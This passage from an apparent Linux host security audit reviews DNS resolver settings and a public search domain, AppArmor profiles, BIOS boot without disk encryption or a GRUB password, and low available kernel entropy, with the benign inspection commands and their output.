Regarding the DNS configuration we checked that the `/etc/hosts` file does not contain any harmful entries. Furthermore, we checked the `/etc/resolv.conf` file which uses a nameserver in our local subnet.

```default
secureding [~]: cat /etc/resolv.conf 
nameserver 10.1.0.1
search offsec.net
```

The use of public search domains in this use case `offsec.net` is highly discouraged as this might leak local traffic to the registrar of `offsec.net`.

## Misc

Diving deep into the security settings of the operating system we have validated that all configuration files in `/etc/security/` are valid. We further checked the status off AppArmor which is enabled and has three profiles loaded.

```default
secureding [~]: apparmor_status 
apparmor module is loaded.
3 profiles are loaded.
3 profiles are in enforce mode.
   lsb_release
   nvidia_modprobe
   nvidia_modprobe//kmod
0 profiles are in complain mode.
0 processes have profiles defined.
0 processes are in enforce mode.
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```

We also found out the system is using BIOS boot instead of UEFI. Furthermore, no hard drive encryption is being used and GRUB2 is not protected by a password. Last was the low available entropy given by the system. On high entropy system the value should be close to `4096`.

```default
secureding [~]: cat /proc/sys/kernel/random/entropy_avail
303
secureding [~]: cat /proc/sys/kernel/random/poolsize 
4096
```
